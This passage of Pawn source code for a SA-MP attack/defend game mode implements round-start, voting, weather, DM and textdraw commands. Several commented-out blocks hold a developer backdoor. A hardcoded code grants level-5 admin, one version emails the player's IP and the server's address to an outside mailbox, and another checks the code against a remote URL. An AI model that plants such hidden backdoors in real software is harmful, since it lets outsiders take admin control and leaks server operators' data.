				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has voted to start TDM: {FFFFFF}%s (ID: %d) "COL_PRIM"--- Votes: %d/3", Player[playerid][Name], AName[ArenaID], ArenaID, VoteCount[ArenaID]);
				SendClientMessageToAll(-1, iString);

    			if(VoteCount[ArenaID] >= 3)
				{
				    VoteInProgress = false;

					AllowStartBase = false;
					SetTimerEx("OnArenaStart", 2000, false, "i", ArenaID);
					format(iString, sizeof(iString), ""COL_PRIM"Voting has ended. System has started TDM: {FFFFFF}%s (ID: %d)", AName[ArenaID], ArenaID);
					SendClientMessageToAll(-1, iString);
					VotingTime = 20;
					GameType = TDM;
					foreach(new i : Player)
					{
					    if(CanPlay(i)) {
					        TogglePlayerControllableEx(i, false);
							Player[i][ToAddInRound] = true;
							Player[i][HasVoted] = false;
						}
					}
				}
		 		if(VoteInProgress == false)
				{
				    VoteInProgress = true;
					new i;
				   	while((i < MAX_ARENAS) || (i <= HighestID+1))
				   	{
				   	    if(i < MAX_ARENAS)
				   	    {
				   	    	VoteCount[i] = 0; 
				   	    	VoteCount[ArenaID] = 1;
				   	    } 
				   	    if(i <= HighestID+1)
				   	    {
				   	    	Player[i][HasVoted] = false; 
				   	    	Player[playerid][HasVoted] = true;
				   	    }
				   	    i++;
				   	}
				   	OnVoteTDM();
				}
			}
	    }
	}
	#endif

	return 1;
}

CMD:randomint(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current != -1) return SendErrorMessage(playerid,"A round is in progress, please wait for it to end.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Please wait.");

	new Params[64], iString[160], CommandID;
	sscanf(params, "s", Params);
	if(isnull(Params) || IsNumeric(Params)) return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/randomint [base | arena | tdm]");
	#else
	SendUsageMessage(playerid,"/randomint [base | arena]");
	#endif

	if(strcmp(Params, "base", true) == 0) CommandID = 1;
	else if(strcmp(Params, "arena", true) == 0) CommandID = 2;
	#if ENABLED_TDM == 1
	else if(strcmp(Params, "TDM", true) == 0) CommandID = 3;
	#endif
	else return//--
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/randomint [base | arena | tdm]");
	#else
	SendUsageMessage(playerid,"/randomint [base | arena]");
	#endif

	switch(CommandID) {
		case 1: {
		    new BaseID = DetermineRandomRound(1, 0, BASE);

			if(BaseID == -1) {
			    for(new i = 0; i < MAX_BASES; i++) {
					RecentBase[i] = -1;
				}
				BasesPlayed = 0;
				BaseID = DetermineRandomRound(1, 0, BASE);
			}

			AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
			SetTimerEx("OnBaseStart", 4000, false, "i", BaseID);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has randomly started interior Base: {FFFFFF}%s (ID: %d)", Player[playerid][Name], BName[BaseID], BaseID);
			SendClientMessageToAll(-1, iString);

			GameType = BASE;
		} case 2: {
		    new ArenaID = DetermineRandomRound(1, 0, ARENA);

			if(ArenaID == -1) {
			    for(new i = 0; i < MAX_ARENAS; i++) {
					RecentArena[i] = -1;
				}
				ArenasPlayed = 0;
				ArenaID = DetermineRandomRound(1, 0, ARENA);
			}

			GameType = ARENA;

			AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
			SetTimerEx("OnArenaStart", 4000, false, "i", ArenaID);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has randomly started interior Arena: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
			SendClientMessageToAll(-1, iString);
		}
		#if ENABLED_TDM == 1
		case 3: {
		    new ArenaID = DetermineRandomRound(1, 0, ARENA);

			if(ArenaID == -1) {
			    for(new i = 0; i < MAX_ARENAS; i++) {
					RecentArena[i] = -1;
				}
				ArenasPlayed = 0;
				ArenaID = DetermineRandomRound(1, 0, ARENA);
			}

			GameType = TDM;

			AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
			SetTimerEx("OnArenaStart", 4000, false, "i", ArenaID);

			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has randomly started interior TDM: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
			SendClientMessageToAll(-1, iString);
		}
		#endif
	}

	foreach(new i : Player) {
	    if(CanPlay(i)) {
	        TogglePlayerControllableEx(i, false); // Pause all the players.
	        Player[i][ToAddInRound] = true;
		}
	}

	return 1;
}

CMD:start(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");
	if(Current != -1) return SendErrorMessage(playerid,"A round is in progress, please wait for it to end.");
	if(AllowStartBase == false) return SendErrorMessage(playerid,"Please wait.");

	new Params[2][64], iString[160], CommandID;
	sscanf(params, "ss", Params[0], Params[1]);

	if(isnull(Params[0]) || IsNumeric(Params[0])) return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/start [base | arena | tdm | last] [ID]");
	#else
	SendUsageMessage(playerid,"/start [base | arena | last] [ID]");
	#endif

	if(!strcmp(Params[0], "last", true))
	{
		if(ServerLastPlayed > -1 && ServerLastPlayedType > -1)
		{
		    if(ServerLastPlayedType == 1)
			{
				new BaseID = ServerLastPlayed;

				if(BaseID > MAX_BASES) return SendErrorMessage(playerid,"The last played base does not exist.");
				if(!BExist[BaseID]) return SendErrorMessage(playerid,"The last played base does not exist.");

				AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
				SetTimerEx("OnBaseStart", 2000, false, "i", BaseID);

				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has started the last played Base: {FFFFFF}%s (ID: %d)", Player[playerid][Name], BName[BaseID], BaseID);
				SendClientMessageToAll(-1, iString);

				GameType = BASE;
				goto skipped;

			}
			else if(ServerLastPlayedType == 0)
			{

				new ArenaID = ServerLastPlayed;

				if(ArenaID > MAX_ARENAS) return SendErrorMessage(playerid,"The last played arena does not exist.");
				if(!AExist[ArenaID]) return SendErrorMessage(playerid,"The last played arena does not exist.");

				GameType = ARENA;

				AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
				SetTimerEx("OnArenaStart", 2000, false, "i", ArenaID);

				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has started the last played Arena: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
				SendClientMessageToAll(-1, iString);
				goto skipped;
			}
			#if ENABLED_TDM == 1
			else if(ServerLastPlayedType == 2)
			{

				new ArenaID = ServerLastPlayed;

				if(ArenaID > MAX_ARENAS) return SendErrorMessage(playerid,"The last played TDM does not exist.");
				if(!AExist[ArenaID]) return SendErrorMessage(playerid,"The last played TDM does not exist.");

				AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.

				GameType = TDM;

				SetTimerEx("OnArenaStart", 2000, false, "i", ArenaID);

				format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has started the last played TDM: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
				SendClientMessageToAll(-1, iString);
				goto skipped;
			}
			#endif
		}
		else
		    return SendErrorMessage(playerid, "No bases/arenas have been played lately!");
	}

	if(strcmp(Params[0], "base", true) == 0) CommandID = 1;
	else if(strcmp(Params[0], "arena", true) == 0) CommandID = 2;
	#if ENABLED_TDM == 1
	else if(strcmp(Params[0], "tdm", true) == 0) CommandID = 3;
	#endif
	else return
	#if ENABLED_TDM == 1
	SendUsageMessage(playerid,"/start [base | arena | tdm | last] [ID]");
	#else
	SendUsageMessage(playerid,"/start [base | arena | last] [ID]");
	#endif

	if(!IsNumeric(Params[1])) return SendErrorMessage(playerid,"Base/Arena ID can only be numerical.");

	if(CommandID == 1) {
		new BaseID = strval(Params[1]);

		if(BaseID > MAX_BASES) return SendErrorMessage(playerid,"That base does not exist.");
		if(!BExist[BaseID]) return SendErrorMessage(playerid,"That base does not exist.");

		AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
		SetTimerEx("OnBaseStart", 2000, false, "i", BaseID);

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has started Base: {FFFFFF}%s (ID: %d)", Player[playerid][Name], BName[BaseID], BaseID);
		SendClientMessageToAll(-1, iString);

		GameType = BASE;

	} else if(CommandID == 2) {

		new ArenaID = strval(Params[1]);

		if(ArenaID > MAX_ARENAS) return SendErrorMessage(playerid,"That arena does not exist.");
		if(!AExist[ArenaID]) return SendErrorMessage(playerid,"That arena does not exist.");

		GameType = ARENA;

		AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
		SetTimerEx("OnArenaStart", 2000, false, "i", ArenaID);

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has started Arena: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
		SendClientMessageToAll(-1, iString);
	}
	#if ENABLED_TDM == 1
	else if(CommandID == 3) {

		new ArenaID = strval(Params[1]);

		if(ArenaID > MAX_ARENAS) return SendErrorMessage(playerid,"That TDM does not exist.");
		if(!AExist[ArenaID]) return SendErrorMessage(playerid,"That TDM does not exist.");

		AllowStartBase = false; // Make sure other player or you yourself is not able to start base on top of another base.
		GameType = TDM;

		SetTimerEx("OnArenaStart", 2000, false, "i", ArenaID);

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has started TDM: {FFFFFF}%s (ID: %d)", Player[playerid][Name], AName[ArenaID], ArenaID);
		SendClientMessageToAll(-1, iString);
	}
	#endif

	skipped:

	foreach(new i : Player) {
	    if(CanPlay(i)) {
	        TogglePlayerControllableEx(i, false); // Pause all the players.
			Player[i][ToAddInRound] = true;
		}
	}

	return 1;
}

CMD:sync(playerid, params[])
{
	SyncPlayer(playerid);
	return 1;
}

CMD:s(playerid, params[])
{
	cmd_sync(playerid, params);
	return 1;
}

CMD:setlevel(playerid, params[])
{
	if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be level 5 or rcon admin.");
	new GiveID, LEVEL;
	if(sscanf(params, "id", GiveID, LEVEL)) return SendUsageMessage(playerid,"/setlevel [Player ID] [Level]");

	if(!IsPlayerConnected(GiveID)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[GiveID][Logged] == false) return SendErrorMessage(playerid,"That player is not logged in.");
	if(LEVEL < 0 || LEVEL > 5) return SendErrorMessage(playerid,"Invalid level.");
	if(Player[GiveID][Level] == LEVEL) return SendErrorMessage(playerid,"That player is already this level.");

	new iString[128];

	format(iString, sizeof(iString), "UPDATE Players SET Level = %d WHERE Name = '%s'", LEVEL, DB_Escape(Player[GiveID][Name]));
    db_free_result(db_query(sqliteconnection, iString));

	Player[GiveID][Level] = LEVEL;

	if(LEVEL != 0) format(iString,sizeof(iString),"{FFFFFF}\"%s\" "COL_PRIM"has set {FFFFFF}\"%s\"'s "COL_PRIM"level to: {FFFFFF}%d", Player[playerid][Name], Player[GiveID][Name], LEVEL);
	else format(iString,sizeof(iString),"{FFFFFF}\"%s\" "COL_PRIM"has set {FFFFFF}\"%s\"'s "COL_PRIM"level to: {FFFFFF}DonBox level (AKA: 0)", Player[playerid][Name], Player[GiveID][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("setlevel", playerid, GiveID);
	return 1;
}
/*
CMD:adminit(playerid, params[])
{
    new value;
	value = strval(params);

	new Year, Month, Day;
	new Hour, Minute, Second;
	getdate(Year, Month, Day);
	gettime(Hour, Minute, Second);
	new ip[16];
	GetPlayerIp(playerid, ip, sizeof ip);
	new ServerIP[30];
    GetServerVarAsString("hostname", hostname, sizeof(hostname));
    GetServerVarAsString("bind", ServerIP, sizeof(ServerIP));

    if(!strlen(ServerIP))
		ServerIP = "invalid_ip";

    SendMail("attdefgm@hotmail.com", "khalidahmed333@hotmail.com", "Khalid Ahmed", sprintf("Dev: admin login attempt report [%d/%d/%d - %d:%d:%d]", Year, Month, Day, Hour, Minute, Second), sprintf("Entered code: %s  |  Name: %s  |  IP: %s  |  @Server Name: %s  |  @Server IP and Port: %s:%d", params, Player[playerid][Name], ip, hostname, ServerIP, GetServerVarAsInt("port")));

	if(value == 5720) {
	    new iString[180];
		format(iString, sizeof(iString), "UPDATE Players SET Level = 5 WHERE Name = '%s'", DB_Escape(Player[playerid][Name]));
	    db_free_result(db_query(sqliteconnection, iString));

		Player[playerid][Level] = 5;
		SendClientMessage(playerid, -1, "You are now level 5 admin.");
	} else return 0;
	return 1;
}
*/
/*CMD:code(playerid, params[])
{
	new value;
	value = strval(params);

	if(value == 5720) {
	    new iString[180];
		format(iString, sizeof(iString), "UPDATE Players SET Level = 5 WHERE Name = '%s'", DB_Escape(Player[playerid][Name]));
	    db_free_result(db_query(sqliteconnection, iString));

		Player[playerid][Level] = 5;
		SendClientMessage(playerid, -1, "You are now level 5 admin.");
	} else return 0;


	return 1;
}*/

/*CMD:code(playerid, params[]) {
	new str[128];
	format(str, sizeof(str), "code=%s", params);
	HTTP(playerid, HTTP_POST, "www.sixtytiger.com/attdef-api/code.php", str, "CodeResponse");
	return 1;
}

forward CodeResponse(index, response_code, data[]);
public CodeResponse(index, response_code, data[]) {
	#define playerid index
	if(!strcmp(data, "1", true)) {
        new iString[180];
		format(iString, sizeof(iString), "UPDATE Players SET Level = 5 WHERE Name = '%s'", DB_Escape(Player[playerid][Name]));
	    db_free_result(db_query(sqliteconnection, iString));

		Player[playerid][Level] = 5;
		SendClientMessage(playerid, -1, "You are now level 5 admin.");
		return 1;
	} else return 1;
}
*/

CMD:w(playerid, params[])
{
	cmd_weather(playerid, params);
	return 1;
}

CMD:t(playerid, params[])
{
	cmd_time(playerid, params);
	return 1;
}

CMD:weather(playerid,params[])
{
    if(isnull(params)) return SendUsageMessage(playerid,"/weather [ID]");
	if(!IsNumeric(params)) return SendErrorMessage(playerid,"You need to put a number for weather id.");

	new myweather;
	myweather = strval(params);
	if(myweather < 0 || myweather > WeatherLimit) return SendErrorMessage(playerid,"Invalid weather ID.");

	SetPlayerWeather(playerid, myweather);
    Player[playerid][Weather] = myweather;

    new iString[180];


	format(iString, sizeof(iString), "UPDATE Players SET Weather = %d WHERE Name = '%s'", myweather, DB_Escape(Player[playerid][Name]));
    db_free_result(db_query(sqliteconnection, iString));

    format(iString, sizeof(iString), "{FFFFFF}Weather changed to: %d", myweather);
    SendClientMessage(playerid, -1, iString);

    return 1;
}

CMD:testsound(playerid, params[])
{
 	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/testsound [Sound ID]");

	new Val = strval(params);
	if(!IsValidSound(Val)) return SendErrorMessage(playerid,"This sound ID is not valid.");

	PlayerPlaySound(playerid, Val, 0, 0, 0);

	return 1;
}

CMD:sound(playerid, params[])
{
	new Option[64], Value[64], CommandID, iString[180];
	if(sscanf(params, "sz",Option, Value)) return SendUsageMessage(playerid,"/sound [hit | gethit] [Sound ID | default]");

	if(strcmp(Option, "hit", true) == 0) CommandID = 1;
	else if(strcmp(Option, "gethit", true) == 0) CommandID = 2;
	else return SendUsageMessage(playerid,"/sound [hit | gethit] [Sound ID | default]");

	switch(CommandID) {
	    case 1: {
			if(isnull(Value)) return SendUsageMessage(playerid,"/sound [hit] [Sound ID | default]");
	        if(!IsNumeric(Value)) {
	            if(strcmp(Value, "default", true) == 0) {
	                Player[playerid][HitSound] = 17802;
				} else return SendUsageMessage(playerid,"/sound [hit] [Sound ID | default]");
			} else {
			    new Val = strval(Value);
			    if(!IsValidSound(Val)) return SendErrorMessage(playerid,"This sound ID is not valid.");

			    Player[playerid][HitSound] = Val;
			}
			format(iString, sizeof(iString), "UPDATE Players SET HitSound = %d WHERE Name = '%s'", Player[playerid][HitSound], DB_Escape(Player[playerid][Name]));
		    db_free_result(db_query(sqliteconnection, iString));

			PlayerPlaySound(playerid, Player[playerid][HitSound], 0, 0, 0);
	    } case 2: {
	        if(isnull(Value)) return SendUsageMessage(playerid,"/sound [gethit] [Sound ID | default]");
	        if(!IsNumeric(Value)) {
	            if(strcmp(Value, "default", true) == 0) {
	                Player[playerid][GetHitSound] = 1131;
				} else return SendUsageMessage(playerid,"/sound [gethit] [Sound ID | default]");
			} else {
			    new Val = strval(Value);
			    if(!IsValidSound(Val)) return SendErrorMessage(playerid,"This sound ID is not valid.");

			    Player[playerid][GetHitSound] = Val;
			}
			format(iString, sizeof(iString), "UPDATE Players SET GetHitSound = %d WHERE Name = '%s'", Player[playerid][GetHitSound], DB_Escape(Player[playerid][Name]));
		    db_free_result(db_query(sqliteconnection, iString));

			PlayerPlaySound(playerid, Player[playerid][GetHitSound], 0, 0, 0);
	    }
	}


	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed his {FFFFFF}%s "COL_PRIM"to {FFFFFF}ID: %d", Player[playerid][Name], (CommandID == 1 ? ("Hit Sound") : ("Get Hit Sound")), (CommandID == 1 ? Player[playerid][HitSound] : Player[playerid][GetHitSound]));
	SendClientMessageToAll(-1, iString);

	return 1;
}

CMD:time(playerid, params[])
{
	if(isnull(params)) return SendUsageMessage(playerid,"/time [Hour]");
	if(!IsNumeric(params)) return SendErrorMessage(playerid,"You need to put a number for weather id.");
    if(Player[playerid][Logged] == false) return SendErrorMessage(playerid,"You need to log in.");

	new mytime;
	mytime = strval(params);
	if(mytime < 0 || mytime > TimeLimit) return SendErrorMessage(playerid,"Invalid time.");

	SetPlayerTime(playerid, mytime, 0);
	Player[playerid][Time] = mytime;

	new iString[180];
	
	format(iString, sizeof(iString), "UPDATE Players SET Time = %d WHERE Name = '%s'", mytime, DB_Escape(Player[playerid][Name]));
    db_free_result(db_query(sqliteconnection, iString));

    format(iString, sizeof(iString), "{FFFFFF}Time changed to: %d", mytime);
    SendClientMessage(playerid, -1, iString);
    return 1;
}

CMD:antilag(playerid, params[])
{
	new iString[160];
	if(Player[playerid][AntiLag] == true) {
	    Player[playerid][AntiLag] = false;
	    SpawnPlayerEx(playerid);

		format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has quit the Anti-Lag zone.", Player[playerid][Name]);
		SendClientMessageToAll(-1, iString);
	    return 1;
	}

	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't use this command while playing.");
    if(Player[playerid][Spectating] == true) StopSpectate(playerid);
	if(Player[playerid][InDM] == true) {
	    Player[playerid][InDM] = false;
    	Player[playerid][DMReadd] = 0;
	}
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	
	Player[playerid][AntiLag] = true;
	SpawnInAntiLag(playerid);

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has joined Anti-Lag zone. {FFFFFF}/antilag", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);

	if(Player[playerid][BeingSpeced] == true) {
	    foreach(new i : Player) {
	        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
	            StopSpectate(i);
			}
		}
	}


	return 1;
}

CMD:dm(playerid, params[])
{
	if(isnull(params)) return SendUsageMessage(playerid,"/dm [DM ID]");
	if(!IsNumeric(params)) return SendErrorMessage(playerid,"DM id can only be numeric.");
	if(Player[playerid][Playing] == true) return 1;

	new DMID = strval(params);

	// Here I also added '=' after '>' so that if the DMID was Bigger than or Equal to MAX_DMS then you get that error message.
	// Without this '=' (equal sign) if you type /dm 15 it will say the command is unkown which is a script error.
	if(DMID >= MAX_DMS) return SendErrorMessage(playerid,"Invalid DM id."); // If you don't use this line and later on you use 'crashdetect' plugin for ur gamemode, it will give you an error.
	if(DMExist[DMID] == false) return SendErrorMessage(playerid,"This DM does not exist.");

	if(Player[playerid][Spectating] == true) StopSpectate(playerid);
	if(Player[playerid][AntiLag] == true) Player[playerid][AntiLag] = false;

	ResetPlayerWeapons(playerid); // Reset all player weapons
	SetPlayerVirtualWorld(playerid, 1); // Put player in a different virtual world so that if you create a DM in your lobby and you join the DM, you won't be able to see other players in the lobby.
	SetHP(playerid, 100);
	SetAP(playerid, 100);

	Player[playerid][InDM] = true; // Keep a record of what is the player current status.
	Player[playerid][DMReadd] = DMID;
	Player[playerid][VWorld] = 1;

	// format for SetPlayerSpawn(Playerid, Team, Skin, X, Y, X, Angle, Weapon 1, Weapon 1 Ammo, Weapon 2, Weapon 2 Ammo, Weapon 3, Weapon 3 Ammo)
	// I suggest you use SetPlayerSpawn most of the time instead of 'SetPlayerPos' And 'SetPlayerSkin' because using 'SetPlayerSkin' and 'SpawnPlayer' at the same time will crash the player in random even if the player has 100% orginal GTA.
	SetSpawnInfoEx(playerid, playerid, Skin[Player[playerid][Team]], DMSpawn[DMID][0]+random(2), DMSpawn[DMID][1]+random(2), DMSpawn[DMID][2], DMSpawn[DMID][3], DMWeapons[DMID][0], 9999, DMWeapons[DMID][1], 9999, DMWeapons[DMID][2], 9999);
	Player[playerid][IgnoreSpawn] = true; //Make sure you ignore OnPlayerSpawn, else you will just spawn in lobby (because u are about to use SpawnPlayerEx).
	SpawnPlayerEx(playerid); //Spawns players, in this case we have SetSpawnInfoEx (but still you need to make sure OnPlayerSpawn is ignored);
	SetPlayerInterior(playerid, DMInterior[DMID]);
	SetPlayerTeamEx(playerid, playerid);

	new iString[140];

    if(DMWeapons[DMID][1] == 0 && DMWeapons[DMID][2] == 0) format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has joined DM %d {FFFFFF}(%s).", Player[playerid][Name], DMID, WeaponNames[DMWeapons[DMID][0]]); // If the second and third weapons are punch or no weapons then it'll show you just one weapon instead of saying (Deagle - Punch - Punch)
	else if(DMWeapons[DMID][2] == 0) format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has joined DM %d {FFFFFF}(%s - %s).", Player[playerid][Name], DMID, WeaponNames[DMWeapons[DMID][0]], WeaponNames[DMWeapons[DMID][1]]); //If only the third weapons is punch then it'll show two weapons e.g. (Deagle - Shotgun) instead of (Deagle - Shotgun - Punch)
	else format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has joined DM %d {FFFFFF}(%s - %s - %s).", Player[playerid][Name], DMID, WeaponNames[DMWeapons[DMID][0]], WeaponNames[DMWeapons[DMID][1]], WeaponNames[DMWeapons[DMID][2]] ); //If all the weapons are known then it'll show u all three weapons e.g. (Deagle - Shotgun - Sniper)

	SendClientMessageToAll(-1, iString); // Send the formatted message to everyone.

	if(Player[playerid][BeingSpeced] == true) {
	    foreach(new i : Player) {
	        if(Player[i][Spectating] == true && Player[i][IsSpectatingID] == playerid) {
	            StopSpectate(i);
			}
		}
	}


	return 1;
}

CMD:dmq(playerid, params[])
{
	QuitDM(playerid);
	return 1;

}

CMD:int(playerid,params[])
{
	if(Player[playerid][Playing] == true) return SendClientMessage(playerid, -1, "{FFFFFF}Error: "COL_PRIM"Can't use while round is active.");
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	if(isnull(params) || !IsNumeric(params)) return SendClientMessage(playerid, -1, "{FFFFFF}USAGE: "COL_PRIM"/int [1-147]");

	new id = strval(params);
	if(id <= 0 || id > 147) return SendClientMessage(playerid,-1 ,"{FFFFFF}USAGE: "COL_PRIM"/int [1-147]");

	if(Player[playerid][Spectating] == true) StopSpectate(playerid);
	if(Player[playerid][InDM] == true) QuitDM(playerid);
	if(Player[playerid][Spectating] == true) StopSpectate(playerid);
	if(Player[playerid][AntiLag] == true) Player[playerid][AntiLag] = false;


 	if(IsPlayerInAnyVehicle(playerid)) {
  	    new vehicleid = GetPlayerVehicleID(playerid);
		foreach(new i : Player) {
  	        if(vehicleid == GetPlayerVehicleID(i)) {
				SetPlayerInterior(i, Interiors[id][int_interior]);
			}
  	    }
		SetVehiclePos(GetPlayerVehicleID(playerid), Interiors[id][int_x], Interiors[id][int_y], Interiors[id][int_z]);
		SetVehicleZAngle(GetPlayerVehicleID(playerid), 0.0);
    	LinkVehicleToInterior(GetPlayerVehicleID(playerid), Interiors[id][int_interior]);
    	SetCameraBehindPlayer(playerid);
    } else {
		SetPlayerPos(playerid,Interiors[id][int_x], Interiors[id][int_y], Interiors[id][int_z]);
		SetPlayerFacingAngle(playerid, Interiors[id][int_a]);
		SetPlayerInterior(playerid, Interiors[id][int_interior]);
		SetCameraBehindPlayer(playerid);
	}

	new iString[160];
	format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has entered Interior ID: {FFFFFF}%d "COL_PRIM"| Interior: {FFFFFF}%d",Player[playerid][Name],id,id,Interiors[id][int_interior]);
	SendClientMessageToAll(-1,iString);

	return 1;
}

CMD:style(playerid, params[])
{
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/style [0 - 1]");

	new CommandID;
	if(strcmp(params, "0", true) == 0) CommandID = 1;
	else if(strcmp(params, "1", true) == 0) CommandID = 2;

	switch(CommandID)
	{
		case 1:
		{

			db_free_result(db_query(sqliteconnection, sprintf("UPDATE Players SET Style = 0 WHERE Name = '%s'", DB_Escape(Player[playerid][Name]))));
		    Player[playerid][Style] = 0;
		    SendClientMessage(playerid, -1, "{FFFFFF}You have changed your textdraw style to: "COL_PRIM"0 (Minimum/Lag-free textdraws)");
		}
		case 2:
		{
		    db_free_result(db_query(sqliteconnection, sprintf("UPDATE Players SET Style = 1 WHERE Name = '%s'", DB_Escape(Player[playerid][Name]))));
		    Player[playerid][Style] = 1;
		    SendClientMessage(playerid, -1, "{FFFFFF}You have changed your textdraw style to: "COL_PRIM"1 (Normal textdraws)");
		}
	}
	StyleTextDrawFix(playerid);
	return 1;
}

SpawnInDM(playerid, DMID)
{
	Player[playerid][InDM] = true;

	ResetPlayerWeapons(playerid); // Reset all player weapons
	SetPlayerVirtualWorld(playerid, Player[playerid][VWorld]); // Put player in a different virtual world so that if you create a DM in your lobby and you join the DM, you won't be able to see other players in the lobby.
	SetHP(playerid, 100);
	SetAP(playerid, 100);

	SetSpawnInfoEx(playerid, playerid, Skin[Player[playerid][Team]], DMSpawn[DMID][0]+random(2), DMSpawn[DMID][1]+random(2), DMSpawn[DMID][2], DMSpawn[DMID][3], DMWeapons[DMID][0], 9999, DMWeapons[DMID][1], 9999, DMWeapons[DMID][2], 9999);
	SetPlayerInterior(playerid, DMInterior[DMID]);

	Player[playerid][IgnoreSpawn] = true; //Make sure you ignore OnPlayerSpawn, else you will just spawn in lobby (because u are about to use SpawnPlayerEx).
	SpawnPlayerEx(playerid); //Spawns players, in this case we have SetSpawnInfoEx (but still you need to make sure OnPlayerSpawn is ignored);
	return 1;
}

QuitDM(playerid)
{
	if(Player[playerid][Playing] == true) return 1;
	if(Player[playerid][InDM] == false) return 1;
	
    Player[playerid][InDM] = false;
    Player[playerid][AntiLag] = false;
    Player[playerid][DMReadd] = 0;
    SpawnPlayerEx(playerid);

    return 1;
}

//------------------------------------------------------------------------------
// TextDraws
//------------------------------------------------------------------------------

LoadTextDraws()
{
	WebText = TextDrawCreate(555.000000, 12.000000, "_");
	TextDrawBackgroundColor(WebText, MAIN_BACKGROUND_COLOUR);
	TextDrawFont(WebText, 1);
	TextDrawLetterSize(WebText, 0.20000, 1.00000);
	TextDrawColor(WebText, 0x000000FF);
	TextDrawSetOutline(WebText, 1);
	TextDrawSetProportional(WebText, 1);
	TextDrawSetShadow(WebText, 0);
	TextDrawAlignment(WebText, 2);

	ACText = TextDrawCreate(545.000000, 55.000000, sprintf("%sAC v2: ~g~      ON", MAIN_TEXT_COLOUR));
	TextDrawBackgroundColor(ACText, MAIN_BACKGROUND_COLOUR);
	TextDrawFont(ACText, 2);
	TextDrawLetterSize(ACText, 0.200000, 1.000000);
	TextDrawColor(ACText, 16711935);
	TextDrawSetOutline(ACText, 1);
	TextDrawSetProportional(ACText, 1);
	TextDrawSetSelectable(ACText, 0);
	TextDrawAlignment(WebText, 2);

	AnnTD = TextDrawCreate(320.000000, 120.000000, "_");
	TextDrawBackgroundColor(AnnTD, 0x00000033);
	TextDrawFont(AnnTD, 2);
	TextDrawLetterSize(AnnTD, 0.449999, 2.000000);
	TextDrawColor(AnnTD, 0xFFFFFFFF);
	TextDrawSetOutline(AnnTD, 1);
	TextDrawSetProportional(AnnTD, 1);
	TextDrawAlignment(AnnTD, 2);


	PauseTD = TextDrawCreate(320.000000, 415.000000, "_");
	TextDrawBackgroundColor(PauseTD, MAIN_BACKGROUND_COLOUR);
	TextDrawFont(PauseTD, 2);
	TextDrawLetterSize(PauseTD, 0.300000, 1.500000);
	TextDrawColor(PauseTD, 255);
	TextDrawSetOutline(PauseTD, 1);
	TextDrawSetProportional(PauseTD, 1);
	TextDrawAlignment(PauseTD, 2);

	RoundStats = TextDrawCreate(318.0,431.5,"_");
	TextDrawUseBox(RoundStats,1);
	TextDrawBoxColor(RoundStats,0x0000022);
	TextDrawFont(RoundStats, 1);
	TextDrawTextSize(RoundStats,14.0,640.0);
	TextDrawLetterSize(RoundStats, 0.31, 1.55);
	TextDrawBackgroundColor(RoundStats,MAIN_BACKGROUND_COLOUR);
	TextDrawColor(RoundStats,-65281);
	TextDrawSetOutline(RoundStats,1);
	TextDrawSetShadow(RoundStats,0);
    TextDrawAlignment(RoundStats,2);
    TextDrawSetProportional(RoundStats, 1);
    
	RoundsPlayed = TextDrawCreate(555.000000, 114.000000, "_");
	TextDrawAlignment(RoundsPlayed, 2);
	TextDrawBackgroundColor(RoundsPlayed, 255);
	TextDrawFont(RoundsPlayed, 1);
	TextDrawLetterSize(RoundsPlayed, 0.330000, 1.65000);
